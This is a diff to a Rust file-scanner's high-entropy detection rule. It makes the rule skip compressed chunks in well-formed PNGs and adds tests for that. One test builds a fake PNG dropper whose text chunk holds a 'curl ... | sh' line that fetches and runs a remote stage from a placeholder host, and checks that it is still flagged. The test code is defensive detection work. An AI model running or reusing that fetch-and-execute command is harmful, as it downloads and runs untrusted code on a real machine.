@@ -8,7 +8,8 @@
 //! - **script/text**: scores the whole content first (weight 15), then a
 //!   base64-encoded payload's *decoded* bytes (weight 8, corroboration-only
 //!   — see [`BASE64_PAYLOAD_WEIGHT`]). Base64 of plain text decodes to low
-//!   entropy and is deliberately not this rule's signal (issue #35).
+//!   entropy and is deliberately not this rule's signal (issue #35). In a
+//!   well-formed, whole PNG the raw check skips compressed chunk payloads.
 //! - **any other opaque binary**: not scored — expected to be high-entropy.
 
 use std::collections::{HashMap, HashSet};
@@ -19,6 +20,7 @@ use crate::base64;
 use crate::context::{ScanContext, MAX_STREAM_BYTES};
 use crate::macho;
 use crate::model::{MatchedSignal, SignalCategory};
+use crate::png;
 use crate::source::ByteSource;
 use crate::textclass::{classify_text, TextClass, BINARY_MAGICS, MIN_SAMPLE_BYTES};
 
@@ -475,7 +477,11 @@ impl HighEntropyRule {
         }
 
         if let TextClass::Text { container_evidence } = classify_text(content, &ctx.path) {
-            return Ok(self.eval_embedded_payload(content, container_evidence));
+            let png_rest = container_evidence
+                .then(|| outside_png_payloads(ctx, content))
+                .flatten();
+            let raw = png_rest.as_deref().unwrap_or(content);
+            return Ok(self.eval_embedded_payload(content, raw, container_evidence));
         }
 
         // Opaque non-Mach-O binary: high entropy is expected, so no suspicion.
@@ -693,17 +699,19 @@ impl HighEntropyRule {
     }
 
     /// Score a script/text file for an embedded high-entropy payload: first
-    /// the whole content (raw binary spliced in), then a qualifying
-    /// base64-encoded run's *decoded* bytes (module docs above). Neither
-    /// path fires on base64 of ordinary text — decoding that yields low
-    /// entropy, which is the point.
+    /// `raw` (raw binary spliced in; the whole content, or a PNG's bytes
+    /// outside its compressed chunks), then a qualifying base64-encoded
+    /// run's *decoded* bytes anywhere in `content` (module docs above).
+    /// Neither path fires on base64 of ordinary text — decoding that yields
+    /// low entropy, which is the point.
     fn eval_embedded_payload(
         &self,
         content: &[u8],
+        raw: &[u8],
         container_evidence: bool,
     ) -> Option<MatchedSignal> {
-        if content.len() >= MIN_SAMPLE_BYTES {
-            let entropy = shannon_entropy(content);
+        if raw.len() >= MIN_SAMPLE_BYTES {
+            let entropy = shannon_entropy(raw);
             if entropy >= ENTROPY_THRESHOLD {
                 let (weight, what) = if container_evidence {
                     (
@@ -722,7 +730,7 @@ impl HighEntropyRule {
                     description: format!(
                         "{what} (entropy: {:.1} bits/byte over {} bytes)",
                         entropy,
-                        content.len()
+                        raw.len()
                     ),
                     category: self.category(),
                 });
@@ -1180,6 +1188,23 @@ impl TextEntropy {
         };
         (self.counts, self.len, max_window)
     }
+}
+
+/// `content`'s bytes outside a well-formed PNG's compressed-by-design
+/// payloads (§5.2). `None` if `content` is not a well-formed PNG or holds
+/// only part of the file.
+fn outside_png_payloads(ctx: &ScanContext, content: &[u8]) -> Option<Vec<u8>> {
+    if ctx.truncated {
+        return None;
+    }
+    let mut rest = Vec::new();
+    let mut at = 0;
+    for range in png::compressed_ranges(content)? {
+        rest.extend_from_slice(content.get(at..range.start)?);
+        at = range.end;
+    }
+    rest.extend_from_slice(content.get(at..)?);
+    Some(rest)
 }
 
 fn shannon_entropy(data: &[u8]) -> f64 {
@@ -1933,8 +1958,7 @@ mod tests {
         assert!(signal.is_some(), "script with embedded blob should score");
     }
 
-    /// PNG whose first 512 bytes are mostly a text chunk but include the
-    /// header's NULs, then a high-entropy body.
+    /// PNG-headed text then noise, deliberately not well-formed (no CRCs or `IEND`).
     fn png_with_text_and_noise() -> Vec<u8> {
         let mut c = b"\x89PNG\r\n\x1a\n".to_vec();
         c.extend_from_slice(&[0, 0, 0, 13]);
@@ -1973,6 +1997,82 @@ mod tests {
             }
         );
         assert_eq!(weight_of("a.png", content), Some(CONTAINER_BLOB_WEIGHT));
+    }
+
+    /// `len` random bytes behind a valid zlib header.
+    fn zlib_noise(len: usize) -> Vec<u8> {
+        [&[0x78, 0x9c][..], &high_entropy_blob(len)].concat()
+    }
+
+    /// A well-formed PNG: XMP `iTXt` first, then `extra`, an `IDAT` of
+    /// [`zlib_noise`] and `IEND`.
+    fn xmp_png(extra: &[Vec<u8>]) -> Vec<u8> {
+        let mut c = png::SIGNATURE.to_vec();
+        c.extend(png::chunk(
+            b"IHDR",
+            &[0, 0, 1, 0, 0, 0, 1, 0, 8, 2, 0, 0, 0],
+        ));
+        let mut xmp = b"XML:com.adobe.xmp\0\0\0\0\0".to_vec();
+        xmp.extend_from_slice("<rdf:Description about=''/>\n".repeat(20).as_bytes());
+        c.extend(png::chunk(b"iTXt", &xmp));
+        for e in extra {
+            c.extend_from_slice(e);
+        }
+        c.extend(png::chunk(b"IDAT", &zlib_noise(8192)));
+        c.extend(png::chunk(b"IEND", b""));
+        c
+    }
+
+    #[test]
+    fn wellformed_png_not_scored() {
+        let content = xmp_png(&[]);
+        assert!(matches!(
+            classify_text(&content, Path::new("a.png")),
+            TextClass::Text {
+                container_evidence: true
+            }
+        ));
+        assert_eq!(weight_of("a.png", content), None);
+    }
+
+    #[test]
+    fn png_private_chunk_scored() {
+        let content = xmp_png(&[png::chunk(b"stEg", &high_entropy_blob(4096))]);
+        assert_eq!(weight_of("a.png", content), Some(CONTAINER_BLOB_WEIGHT));
+    }
+
+    #[test]
+    fn malformed_png_still_scored() {
+        let good = xmp_png(&[]);
+        let mut trailing = good.clone();
+        trailing.extend_from_slice(&high_entropy_blob(64));
+        let mut bad_crc = good.clone();
+        let last_crc = bad_crc.len() - 4 - 12;
+        bad_crc[last_crc] ^= 1;
+        let truncated = good[..good.len() - 12].to_vec();
+        let mut dup_ihdr = good[..33].to_vec();
+        dup_ihdr.extend_from_slice(&good[8..]);
+        let bad_zlib = xmp_png(&[png::chunk(b"zTXt", b"Comment\0\0\x78\x9dzz")]);
+        for content in [trailing, bad_crc, truncated, dup_ihdr, bad_zlib] {
+            assert_eq!(weight_of("a.png", content), Some(CONTAINER_BLOB_WEIGHT));
+        }
+    }
+
+    #[test]
+    fn truncated_scan_png_scored() {
+        let mut ctx = make_ctx("a.png", xmp_png(&[]));
+        ctx.truncated = true;
+        ctx.file_len = Some(1 << 30);
+        let signal = HighEntropyRule.evaluate(&ctx).unwrap().unwrap();
+        assert_eq!(signal.weight, CONTAINER_BLOB_WEIGHT);
+    }
+
+    #[test]
+    fn png_base64_still_scored() {
+        let mut text = b"Comment\0".to_vec();
+        text.extend_from_slice(base64_encode(&high_entropy_blob(2048)).as_bytes());
+        let content = xmp_png(&[png::chunk(b"tEXt", &text)]);
+        assert_eq!(weight_of("a.png", content), Some(BASE64_PAYLOAD_WEIGHT));
     }
 
     #[test]
@@ -2080,6 +2180,35 @@ mod tests {
         let r = scan_default("dropper", polyglot(b"\x89PNG\r\n\x1a\n", b"# x"));
         let hec = r.signals.iter().find(|s| s.id == "high-entropy-content");
         assert_eq!(hec.map(|s| s.weight), Some(CONTAINER_BLOB_WEIGHT));
+        assert!(matches!(
+            r.recommendation,
+            crate::model::Recommendation::Notify
+                | crate::model::Recommendation::NotifyAndSuggestQuarantine
+        ));
+    }
+
+    /// A dropper framed as a well-formed PNG loses `high-entropy-content`
+    /// (its noise sits in a valid `IDAT`), the accepted trade-off of §5.2,
+    /// but still reaches Notify through its shell line.
+    #[test]
+    fn wellformed_png_dropper_notifies() {
+        let mut text = b"Comment\0\ncurl -fsSL https://example.invalid/stage2 | sh\n".to_vec();
+        text.extend_from_slice(
+            "# padding so the header stays mostly text\n"
+                .repeat(14)
+                .as_bytes(),
+        );
+        let mut c = png::SIGNATURE.to_vec();
+        c.extend(png::chunk(
+            b"IHDR",
+            &[0, 0, 1, 0, 0, 0, 1, 0, 8, 2, 0, 0, 0],
+        ));
+        c.extend(png::chunk(b"tEXt", &text));
+        c.extend(png::chunk(b"IDAT", &zlib_noise(4096)));
+        c.extend(png::chunk(b"IEND", b""));
+        assert!(png::compressed_ranges(&c).is_some());
+        let r = scan_default("dropper", c);
+        assert!(!r.signals.iter().any(|s| s.id == "high-entropy-content"));
         assert!(matches!(
             r.recommendation,
             crate::model::Recommendation::Notify
